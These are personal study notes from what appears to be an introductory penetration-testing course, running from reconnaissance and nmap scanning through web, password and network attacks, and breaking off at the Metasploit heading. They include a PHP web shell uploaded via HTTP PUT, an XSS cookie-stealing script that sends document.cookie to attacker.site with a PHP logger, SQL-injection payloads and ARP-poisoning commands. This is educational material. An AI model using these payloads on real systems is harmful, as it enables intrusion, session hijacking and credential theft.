## (3/3) Penetration Testing Basics

### Information Gathering (5 items)

#### (1/5) Introduction - Study Guide

- First and one of the most crucial phases of an engagement
- A pentester cannot leave any stone unturned
-

#### (2/5) Open-Source Intelligence - Study Guide

- Widening the attack surface
- Mounting targeted attacks
- Sharpening your tools in preparation for the next phases

Information Gathering from Social Networks
- CrunchBase: find detailed information about founders, investors, employees, buyouts and acquisitions

Government Sites
- System for Award Management
- GSA eLibrary

Whois database (also accesible through Linux command `whois`)
- Owner name
- Street addresses
- Email Address
- Technical Contacts

Browsing Client's sites
- Check products
- Services
- Technologies
- Company Culture

Discovering Emai Pattern
- `name.surname@company.com`
- `surname.name@company.com`
- Many email systems tend to inform the sender that mail was not delivered because it does not exit

#### (3/5) Subdomain Enumeration - Study Guide

- We keep on widening the attack surface, discovering as many websites owned by the company as possible
- It's common for websites of the same company to share the same top-level domain name
- Likely to find resources that
  - May contain outdated software
  - Buggy software
  - Administrative Interfaces
- Bug bounty program writeups
- **Passive domain enumeration**: try to identify subdomains without directly interacting with the target
- Google: `site: company.com`
- [dnsdumpster.com](https://dnsdumpster.com)
- `sublist3r` (kali): `sublist3r -d [domain] flag` searches for subdomains in various sources

#### <span style="color:red">(4/5) VIDEO - Subdomain Enumeration</span>
#### (5/5) The Importance of Information Gathering - Study Guide

- Good vs Bad penentration tester
- Darts example: better 1000 shots at a microscopic target or single shot to an impossible to miss big target?
- Cyclic process
- Every information gathering stage will need the same focus and dedication as the first one
- Your penetration test will be **as strong as your weekest skill**!

### Footprinting & Scanning (7 items)

#### (1/7) Disclaimer - Study Guide

> Never run any of these tools and techniques on any machine or netwrok without proper authorization!

#### (2/7) Mapping a Network - Study Guide

- These techniques work both on local and remote
- Every host connected to the Internet or a private network must have a unique IP address

Example:

```
Block: 200.200.0.0/16
2^16 hosts = 200.200.0.0 - 200.200.255.255
```

##### Ping Sweeping

- `ping` command tests whether a machine is alive
- Ping works by sending one or more special ICMP packets (**echo request** - Type 8)
- If the destination host replies with **ICMP echo reply**
- ICMP is part of the IP protocol

- `fping` is an improved version of the `ping` utility

```
fping -a -g IPRANGE

# -a option forces the tool to show only alive hosts
# -g option tells the tool we want to perform a ping sweep instead of standard ping

fping -a -g 10.54.12.0/24
fping -a -g 10.54.12.0 10.54.12.255
```

- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`)
- Those messages are easily removed by:

```
fping -a g 192.168.82.0 192.168.82.255 2>/dev/null
```

##### Nmap Ping Scan

```
nmap -sn 200.200.0.0/16
nmap -sn -iL hostilist.txt
```

```
HOST DISCOVERY:
-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
```

##### OS Fingerprinting

- Possible to identify OS because of some tiny differences in the network stack implementation of the various OS
- Signature of the host behavior
- The signature is compared against a database of known OS signatures
- Offline OS fingerpriting can be done with `p0f` but we'll use `nmap`

```
nmap -Pn -O <target(s)>
# -Pn switch to skip the ping scan if you already know that the targets are alive
```

Nmap options:
```
OS DETECTION:
-O: Enable OS detection
--osscan-limit: Limit OS detection to promising targets
--osscan-guess: Guess OS more aggresively
```

#### <span style="color:red">(3/7) NMAP OS Fingerprinting</span>

#### (4/7) Port Scanning - Study Guide

> Goals:
> - Prepare for the vulnerability assessment phase
> - Perform stealth reconnaissnace
> - Detect firewalls

- Port Scanning goes after knowing the active targets on the network
- Determine what TCP/UDP ports are opened
- Also knowing what services are running, software and version, on an specific port
- Port scanners automate probes requests and response analysis
- Also let you detect if there's a firewall between you and your target
- 3-way handshake:
  - If port is closed -> RST + ACK

##### TCP Connect Scan

- Simplest way to perform a port scan
- If the scanner receives a `RST` packet, then the port is closed
- If the scanner is able to complete the connection, then the port is open
- TCP Connect Scans are recoded in the daemon logs (from the app point of view, the probe looks like a legitimate connection)

##### TCP SYN Scan

- Default nmap scan
- Stealthy by design
- Sends a SYN packet and analyzes the response coming from the target machine
- If a RST packet is received, then port is closed
- if a ACK packet is recevived, then the port is open (and RST packet is sent to the target to stop the handshake)
- Cannot be detected by looking at daemons logs

##### Nmap Scan Types

```
-sT performs a TCP connect scan
-sS performs a SYN scan
-sV performs a version detection scan
```

- `-sV` version detection scan mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port, which isn't stealthy but useful.
- During version detection scan, Nmap performs a TCP connect and reads from the banner of the daemon listening on a port.
- If the daemon does not send a banner, nmap sends some probes to understand what application is, by studying its behavior

###### Specifying targets

- By DNS name: `nmap <scan_type> target1.domain.com target2.domain.com`
- With an IP address list: `namp <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3`
- CIDR notation: `nmap <scan_type> 192.168.1.0/24 200.200.1.0/16`
- By using wildcards: `nmap <scan_type> 192.168.1.*` or `nmap <scan_type> 10.10.*.1` or `nmap <scan_type> 200.200.*.*`
- Specifying ranges: `nmap <scan_types> 200.200.6-12.*`
- Octets Lists: `nmap <scan_types> 10.14.33.1,3,17` or `nmap <scan_type> 10.14,20.3.1,3,17,233`

###### Choosing the ports to scan

- `-p`: `nmap -p 21,22,139,445,443,80 <target>` or `nmap -p 100-1000 <target>`

##### Discovering Network with Port Scanning

- You might encounter networks that are protected by firewalls and where pings are blocked
- It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open
- `-Pn`: forces the scan on a server
- if you would like to find an alive host, you can scan typical ports instead of performing a ping sweep
- the four most basic TCP ports (22, 445, 80, 443) can be used as indicators of live hosts in the network

##### Spotting a Firewall

- You might often see that a version was not recognized regardless of the open port
- Or even the service type is not recognized
- `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data
- `--reason` nmap flag will show an explanation of twhy a port is marked as open or closed

##### Masscan

- Another interesting tool that can help you to discover a network via probing TCP ports
- Designed to deal with large networks and to scan thousands of IP addresses at once
- Like `nmap` but a lot faster, however is less accurate
- Maybe best to use this for host discovery and then conduct a detailed scan with nmap against certain hosts

#### <span style="color:red">VIDEO - (5/7) NMAP Port Scanning</span>
#### <span style="color:red">VIDEO - (6/7) Basic Masscan Usage</span>
#### <span style="color:red">LAB - (7/7) Scanning and OS Fingerprinting</span>

### Vulnerability Assessment (4 items)

#### (1/4) Vulnerability Assessment - Study Guide

> Goal #1: Identify vulnerabilities and security misconfigurations
> Goal #2: Prepare yourself for exploitation phase

- Vulnerability assessment is a phase of the penetration testing process.
- Sometimes customers just asks for a vulnerability assessment instead of a pentest
- During the vulnerability assessment, you do not proceed to the exploitation phase
- This impllies that you will not be able to confirm the vulnerabilities by testing them and giving proof of their existence
- A full penetration test is more in depth than just vulnerability assessment
- Can be carried out both locally and remotely
- Pentesters use vulnerability scanners
  - Database of known vulnerabilities
  - Daemons listening on TCP and UDP ports
  - Config files of OS, software suites, network devices, etc.
  - Windows registry entries
  - The purpose of a scanner is to find vulnerabilities or misconfigurations
  - This scanner tool is up to date by the vendor and it's constantly updated

- OpenVAS
- Nexpose
- GFI Lan Guard
- Nessus

- If you have to test a custom app, a vulnerability scanner isn't enough, you have to test it manually
- Studying custom applications means:
  - learning and understanding its features
  - understanding how it exchanges data over the network
  - understanding how it accesses resources like databases, servers, local and remote files and os on
  - reverse engineering its logic

#### (2/4) Nessus - Study Guide

- Nessus is a easy to use powerful vulnerability scanner that works great both on a small and large company network
- It's free license for non-commercial use, so you can install and use it to secure your home network
- It has two components: client & server
  - Client is used to configure the scans, provides a web interface to configure scans
  - Server performs the scan and repots back to the client, sends probes to systems and applications, collecting the responses and matching them against its vulnerability database

These are the steps that a vulnerability scanner uses:
- Target hosts alive
- Open ports
- Service detection
- For each detected service, the scanner queries its database looking for known vulnerabilites
  - You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities
- Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives

#### <span style="color:red">VIDEO - (3/4) Nessus</span>
#### <span style="color:red">LAB - (4/4) Nessus - Lab</span>

### Web Attacks (16 items)

#### (1/16) Introduction - Study Guide

Web applications use different technologies and programming paradigms compared to desktop apps

#### (2/16) Web Server Fingerprinting - Study Guide

- Webapps often make up the vast majority of the internet-facing surface
- It can be done manually and by using automatic tools
- Fingerprinting a web server means:
  - Web Server Service: IIS, Apache, nginx
  - Version
  - OS hosting the server

# Fingerprinting with Netcat

- Manually send requests to the server
- Banner grabbing:

```bash
nc <target_address> 80
HEAD / HTTP/1.0
```

Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
- Write the request in uppercase always
- Netcat does not notify you after the connection to the server
- You must write your request after running the command (or use `-v`)
- Netcat does not perform any kind of encryption, so you cannot use it for HTTPS

##### Fingerprinting with OpenSSL

- `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
- You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:

```bash
open s_client -connect target.site:443
HEAD / HTTP/1.0
```

##### Fingerprinting with Httprint

- `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers

```bash
httpprint -P0 -h <target hosts> -s <signature file>
# -PO to avoid pinging the host
# -h <target hosts> tells the tool to fingerprint a list of hosts, it is advised to use the IP address of the hosts you want to test
# -s set the signature file to use
```

#### (3/16) HTTP Verbs - Study Guide

- REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
- In REST APIs is common to use PUT for saving data, and not for saving files
- If you confirm a PUT or DELETE during an engagement, you should confirm its exact impact twice

```
# GET is used to request a resource
GET /page.php HTTP/1.1
Host: www.example.site

# You can also pass arguments to the web application
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site

# POST is used to submit HTML form data
# POST parameters must be in the message body
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass

# HEAD is very similar to GET, as it asks just headers of the response instead of the response body
HEAD / HTTP/1.1
Host: www.example.site

# PUT is used to upload a file to a server
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT DATA>

# DELETE is used to remove a file from the server
# Must be configured wisely as it might lead to DoS and data loss
DELETE /path/to/destination HTTP/1.1
Host: www.example.site

# OPTIONS is used to query the web server for enabled HTTP Verbs
OPTIONS / HTTP/1.1
Host: www.example.site
```

##### Exploiting Misconfigured HTTP verbs

- 1st you enumerate verbs with an OPTIONS message in `nc`
- To exploit the DELETE verb, you just have to specify the file you want to delete from the server
- Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content length: 20

<?php phpinfo(); ?>
```

##### PHP Shell

```php
if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
```

Then you could do with `nc`:

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
```

- Misconfigured HTTP verbs are becoming rare in web servers
- You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices

#### <span style="color: red">VIDEO - (4/16) Netcat</span>

#### (5/16) Directories and Files Enumeration - Study Guide

> Ability to:
> - Find and utilize testing features
> - Exploit information saved in backup or old files
> - Find hidden resources

Enumeration helps you find those "hidden" resources that often contain:
- New and untested features
- Backup files
- Testing information
- Developer's notes

Two ways of enumerating resources:
- Pure brute-force
- Dictionary attacks

Tool:
- OWASP Dirbuster
  - Java application that can perform web resources enumeration
  - You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
  - It's Linux alternative: `dirb`

#### <span style="color:red">VIDEO - (6/16) Dirbuster</span>
#### <span style="color:red">VIDEO - (7/16) Dirb</span>
#### <span style="color:red">LAB - (8/16) Dirbuster</span>
#### (9/16) Google Hacking - Study Guide

> Goal #1: perform information gathering without contacting your targets, ability to find hidden resources

- Usage of Google Dorks (ex `inurl:admin intitle:login`)

`site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`

```
inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```

- [Exploit DB](https://www.exploit-db.com/google-hacking-database)

#### (10/16) Cross Site Scripting - Study Guide

> Ability to:
> - Attack webapps' users
> - Control webapps' content
> - Gain advanced web attacks skills

- XSS is a vulnerability that lets an attacker control some of the content of a webapp
- XSS vulnerabilities happen when a webapp uses unfiltered user input to build the output content displayed to its end users, letting an attacker control the output HTML and JS code, targeting the app's users (admin is included)
- XSS involves injecting malicious code into the output of a webpage, this malicious code is the rendered (or executed) by the browser of the visiting users
The attacker can target the webapp's users, and:
  - Modify the content of the site at run-time
  - Inject malicious contents
  - Steal the cookies, thus the session of a user
  - Perform actions on the web application as if it was a legitimate user

 User input is any parameter coming from the clientside of the webapp, as:
  - Request headers
  - Cookies
  - Form inputs
  - POST parameters
  - GET paramaters

 Actors of a XSS attack:
 - Vulnerable website
   - inputs should always be validated server side
   - never ever trust user input
 - User/visitor (victim)
   - Code executed/rendered by the browser of the visiting users
   - XSS has low priority for developers, which shouldn't be
   - it can be really hard for a victim to realiza that an attack is in progress
 - The pentester, launching attacks:
   - Making their browsers load malicous content
   - Performing operations on their behalf, like buying a product or changing a password
   - Stealing the session cookies, thus being able to impersonate them on the vulnerable site
   - If stolen user is an admin, the entire website can be impersonated

- Reflection Point: When a search parameter is submitted thorugh a form and gets displayed on the output
- After finding a reflection point, you have to underswtand if you can inject HTML code and see if it somehow gets to the output of the page
- Test XSS: `<script>alert('XSS')</script>`

XSS Types:
- Reflected
  - When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
  - When users click on the link , the users trigger the attack
  - `http://victim.site/search.php?find=<payload>`
  - Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
  - Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones
- Persistent
  - Occur when the payload is sent to the vulnerable web server and then stored.
  - When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
  - The malicious code gets delivered each and every time a web browser hits the "injected" web page
  - A single attack can exploit multiple web applications
  - The most common vector for persistent attacks are HTML forms that submit conetnt to the web server and then display that content back to the users
  - Element such as comments, user profiles, and forum posts are potential vector for XSS attacks
- DOM Based

Cookie Stealing via XSS
- When `HttpOnly` flag is disabled, cookies can be stolen
- `<script>alert(document.cookie)</script>`
- With the following code, you can send cookies content to an attacker-controlled site:

```javascript
<script>
  var i = new Image();
  i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>
```

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
flocse($fp);
?>
```

- [OWASP-XSS](https://owasp.org/www-community/attacks/xss/)

#### <span style="color:red">VIDEO - (11/16) XSS</span>
#### <span style="color:red">LAB (12/16) Cross site scripting</span>

#### (13/16) SQL Injections - Study Guide

- They allow an unathorized user to take control over SQL statements used by a web application.
- This kind of attack has a huge impact on a web site because getting contorl over a backend database means controlling:
  - User's credentials
  - Data of the web application
  - Credit Card numbers
  - Shopping transactions

##### SQL basics

An application performs this tasks:
- Connect to the DB
- Submit the query to the database
- Retrieve the results

```sql
-- SELECT <columns list> FROM <table> WHERE <conditions>;
SELECT name, description FROM products WHERE id=9;

-- UNION command performs a union between
<SELECT statement> UNION <other SELECT statement>;
```

##### Vulnerable Dynamic Queries

This dynamic query expects $id values as a string:

```sql
SELECT Name, Description FROM Products WHERE ID='$id'
```

But what if an attacker crafts a $id value which can change the query to something like: ` OR 'a'='a`

Then the query becomes:
```sql
SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
```

Which tells the database to select the items by checking two conditions wich is always true.

An attacker could also exploit the UNION command by supplying the following:

```sql
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
```

Thus it changes the original query to:

```sql
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

To find SQL injections, we need to check any user input (every input must be tested to conduct a professional pentest):
- GET parameters
- POST parameters
- HTTP Headers
  - User-Agent
  - Cookie
  - Accept

Tests can be:
- String terminators: `' and ''`
- SQL commands: `SELECT`, `UNION` and others
- SQL comments: `#` or `--`

##### Boolean Based SQLi

Once penentration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:
- Is the first letter of the username 'a'?
- Does this database contain three tables?
- ...

We can use two MySQL functions: `user()` and `substring()`
- `user()` returns the name of the user currently using the database:

```sql
select user();
```

- `substring()` returns a substring of the given argument. It takes 3 parameters:
  - the input string
  - the position of the substring
  - its length

```sql
select substring('elarnsecurity', 2, 1)
```

We can use both together:
```sql
substring(user(), 1, 1);
--- it might return 'r' for 'root' user

substring(user(), 1, 1) = 'r'
-- if it returns 1 -> True; 0 -> False
```

Combining those features, we can iterate over the letters of the username by using payloads as:

```sql
' or substr(user(), 1, 1) =='a
' or substr(user(), 1, 1) =='b
```

when we find the first letter then we can move to the second and so on in order to guess the entire username.

##### UNION Based SQL Injections

- Many times some of the results of a query are directly displayed on the output page
- This feature can be exploited using the UNION SQL command
- If the payload makes the result of the original query empty, then we can have the results of another, attacker controlled, query shown on the page
- The following payload fornces the web application to display the result of the `user()` function on the output page
- The comment at the end of the line prevents the follwing part of the original query from being parsed by the database, comments the rest from the original query
- The comment also contains a third dash because most of the browsers automaticall remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

```sql
SELECT description FROM items where id='' UNION SELECT user(); -- -';
```

- To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error
- We know there's an injection by `' UNION sELECT null; -- -`, this should display:

```
Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
```

- We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields
- Once we know how many fields are in the query it's time to test which fields are part of the output page
- You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`
- Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`
- Not only `SELECT` queries are vulnerable

##### SQLMap

- Can detect and exploit SQL injections
- Needs to know the vulnerable URL and the parameter to test for a SQLi

```bash
sqlmap -u <URL> -p <inejction parameter> [options]
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
# technique=U --> UNION based SQL injection technique
sqlmap -u <url> --data=<POST string> -p id [options]
# You can copy the POST string from a request intercepted in Burp Suite
```

#### <span style="color:red">VIDEO - (14/16) SQL Injection</span>
#### <span style="color:red">VIDEO - (15/16) Sqlmap</span>
#### <span style="color:red">(16/16) SQL Injection</span>

### System Attacks (6 items)

#### (1/6) Malware - Study Guide

Any software used to misuse computer sistems with the intent to cause a DoS, spy on users activity, get aunauthorized control over one or more computer systems, etc.

- **Virus**: small piece of code that spreads from computer to computer without any direct action or authorization by the owners of the infected machines, normally copying themselves to special sections of the HDD or inside legitimate programs or documents, running everytime an infected program or file is opened
- **Trojan Horse**: comes embedded in seemingly harmless file, being _backdoors_ the most common
- **Backdoors**: two components, server and client
  - Server runs on the victim machine listening on the network in order to accept connections
  - Client runs on the attacker machine
  - `Netbus` or `SubSeven` are very famous
  - If the backdoor server sits behind a firewall, the easiest way to achive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**
  - A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine
- **Rootkit**: designed to hide itself from users and antivirus programs in order to subvert the OS functioning, maintaining privileged access to the victim without being noticed
- **Bootkit**: rootkits which circumvent OS protection mechanisms by executing during the bootstrap phase
- **Adware**: annoying software that shows ads to computer users
- **Spyware**: collects info about user's activity (OS, visited websites, passwords)
- **Greyware**: either spyware, adware or both
- **Dialer**: tries to dial numbers on dial-up connections in order to collect money from the victim's phone bill, nowadays targeting smartphones
- **Keylogger**: special software that records every keystroke on the remote victim machine, winidow names and sends logs to a server controlled by the attacker
  - **Hardware keyloggers**
  - **Rootkit keyloggers**: stealthy and more invisible to the victim user than software keyloggers, hijacks the OS APIs to record keystrokes, intercepting the interrupt tables from the OS
- **Bots**: small pieces of software that get installed on millions of machines to perform DoS, and remotelly commanded by a C&C server
- **Ransomware**: encrypts a computer or smartphone with a secret key and aks its victim for a ransom
- **Data Stealing Malware**: most of the time targeted to a specific company and tailored to work on the target environment
- **Worms**: spread over the network by exploiting OS and SW vulnerabilities, exploiting credentials or misconfigurations to attack a service or a machine, usually worms are part of other software and they offer an entry point into the target system

#### <span style="color:red">VIDEO - (2/6) Backdoor</span>

#### (3/6) Password Attacks - Study Guide

- Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function
- _Password Cracking_ is the process of recovering clear-text passwords starting from their hash, where the attacker tries to guess the password
- There are two main strategies:
  - **Brute force attacks**
    - You try them all!
    - **Generate** and test all the possible valid passwords
    - Given enough time, a brute force attack is always successful
    - Only used when other attack vectors fail
    - Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
    - **John The Ripper**: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
      - Fast because of the high use of parallelization, crack strategies
      - `/etc/passwd`: contains info about user acccounts
      - `/etc/shadow`: contains info about the actual password hashes
      - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
      - `john -incremental -users:<users list> <file to crack>`
      - `john -incremental -users:victim crackme`
      - To display the passwords recovered by `john`, use: `john --show <file>`
  - **Dictionary attacks**
    - Common passwords
    - Faster than pure brute fornce attacks
    - Poorly chosen or default passwords are more exposed to dictionary cracking
    - `john -wordlist=<custom wordlist file> <file to crack>`
    - Install password dictionaries: `apt-get install seclists`
      - You'll find them in `/usr/share/seclists/Passwords`
  - **Mangling words**
    - Variations on dictionary words
    - `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`
  - **Rainbow Tables**
    - Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack
    - A rainbow table contains links between the results of a run of one hashing function and another
    - Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds
    - Great choice to crack simple and complex short passwords
    - `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too)

#### <span style="color:red">VIDEO - (4/6) John the Ripper</span>
#### <span style="color:red">VIDEO - (5/6) Hashcat</span>

#### (6/6) Buffer Overflow Attacks - Study Guide

A BoF attack can lead to:
- An app or OS crash (DoS)
- Privilege escalation
- Remote code execution
- Security features bypass

A buffer is an area in the RAM reserved for temporary data storage:
- User input
- Parts of a video file
- Server banners received by a client application
- etc.
- Buffers have a finite size, therefore: if an app develooper does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code

##### Stack

- A stack is a data structure used to store data.
- Two operation for LIFO stacks: `pop` & `push`
- Space on the stack can be allocated from app's code
- An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app
- If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_
- If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program
- This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit

Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills

### Network Attacks (17 items)

#### (1/17) Authentication Cracking - Study Guide

A similar approach to cracking a password can be used for every service requiring network authentication as: ssh, telnet, remote desktop, HTTP authentication, etc.

##### Brute Force vs Dictionary Attacks

- Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe
  - Network latency
  - Delays on the attacked service
  - Processing time on the attacked server
- Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and defualt usernames and passwords

##### Hydra

- Fast, parallelized, network authentication cracker that supports different protocols:
  - Cisco auth
  - FTP
  - HTTP
  - IMAP
  - RDP
  - SMB
  - SSH
  - Telnet

To get detailed information about a module:
```bash
hydra -U rdp
```

To launch a dictionary attack against a service:

```bash
hydra -L users.txt -P pass.txt <service://server> <options>

# For instance
hydra -L users.txt -P pass.txt telnet://target.server

# Attack session against a password protected web resource
hydra -L users.txt -P pass.txt http-get://localhost/
```

#### <span style="color:red">VIDEO - (2/17) Hydra: Authentication Cracking</span>
#### <span style="color:red">LAB - (3/17) Bruteforce and Password cracking</span>

#### (4/17) Windows Shares - Study Guide

> Ability to:
> - Enumerate network resources
> - Attack Windows sessions
> - Obtain unathorized access to Windows resources

Windows' filesharing can be exploited.
- NetBIOS (Network Basic Input Output System)
  - Allows servers and clients to view network shares on a local area network
  - It can supply some of the following information while querying computers:
    - Hostname
    - NetBIOS name
    - Domain
    - Network shares
  - NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP)
    - UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts)
    - TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_
  - MS Windows browses the network using NetBIOS to:
    - Datagrams to list the sahres and the machines
    - Names to find workgroups
    - Sessions to transmit data to and from a Windows share

##### Shares

An authorized user can access shares by using **UNC Paths (Universal Naming Concetion Paths**:

```
\\ServerName\ShareName\file.nat

\\ComputerName\C$ # access to a volume (C$, D$, E$)

\\ComputerName\admin$ # points to the windows installation directory

\\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
```

Badly configured shares exploitation can lead to:
- Information disclosure
- Unauthorized file access
- Information leakage used to mount a targeted attack

#### (5/17) Null Sessions - Study Guide

- Null session attacks can be used to enumerate a lot of information:
  - Passwords
  - System users
  - System groups
  - Running system processes
- Remotely exploitable
- Nowadays Windows is configured to be immune to this kidn of attack
- Applicable to legacy systems
- Exploits an authentication vulnerability for Windows Adminstrative Shares, lets an attacker connect to a local or remote share wihtout authentication
- Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions

##### Tools

- `nbstat`: windows cmd tool that can display info about the target
- `nbstat -A <IP>`: displays info about a target

```
Name                Type      Status
----------------------------------------
ELS-WINXP     <00>  UNIQUE    Registered
WORKGROUP     <00>  GROUP     Registered
ELS-WINXP     <20>  UNIQUE    Registered
```

- `ELS-WINXP`: name
- `<00>`: workstation
- `UNIQUE`: this computer must have only one IP address assigned
- `<20>`: file sharing service is up and running on the machine
- Once an attacker knows that a machine has a 'File Server' service running, they can enumerate the shares by using `net view`:

```bash
NET VIEW <target IP>
```

- Share enumeration from a Linux Machine is provided by the *Samba suite*
- `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`

`smbclient` also displays *shares that are hidden when using Windows standard tools*:

```
# To enumerate the shares provided by a host
smbclient -L //<target_IP> -N

# -L allows to look at what services are available on a target
# -N forces the tool to not ask for a password
```

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it's time to check if a null session attack is possible. We can exploit `IPC$` administrative share by trying to connect to it without valid credentials.

##### Checking for Null Sessions with Windows

To connect:

```
# This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
NET USE \\<target IP address>\IPC$ '' /u:''

smbclient //<target_IP>/IPC$ -N
```

##### Exploiting Null Sessions with Enum

```bash
enum -S <target>  # -S lets you enumerate the shares of a machine
enum -U <target>  # -U enumerates the users
enum -P <target>  # -P check the password policy
```

- Checking password policies before running an authentication attack lets you fin-tune an attack tool to:
  - Prevent accounts locking
  - Prevent false positives
  - Choose your dictionary or your bruteforcer configuration (as knowing the min and max lengh of a password helps to save time)


##### Exploiting Null Session with Winfo

Automates null session exploitation.

Use with `-n` to tell the tool to use null sessions

```bash
winfo <target_IP> -n
```

##### Exploiting Null Sessoins with Enum4linux

A PERL script that can perform the same operations of `enum` and `winfo`, supplying some other features:
- User enumeration
- Share enumeration
- Group and member enumeration
- Password policy extraction
- OS info detection
- A nmblookup run
- Printer information extraction

#### <span style="color:red">VIDEO - (6/17) Null Session</span>
#### <span style="color:red">LAB - (7/17) Null Session</span>

#### (8/17) ARP Poisoning - Study Guide

ARM poisoning is a powerful attack you can use to intercept traffic on a switched network.
- If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.

> Ability to:
> - Perform MITM attacks
> - Mount advanced attacks
> - Sniff traffic on a switched network

- The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
- Gratuitous ARP replies = ARP reply messages
- The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address
- The opration is performed on every victim
- As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine
- The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so
- This operation lets the hacker sniff traffic between the poisoned hosts even if the machines sit on a switched network
- An attacker could also change the content of the packets
- This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet

##### Dsniff Arpspoof

Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.

before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# right after you can run arpspoof
arpspoof -i <interface> -t <target> -r <host>
# target and hosts are the victims IP addresses
```

####  <span style="color:red">VIDEO - (9/17) ARP Spoofing</span>
#### <span style="color:red">LAB - (10/17) ARP Poisoning</span>

#### (11/17) Metasploit - Study Guide

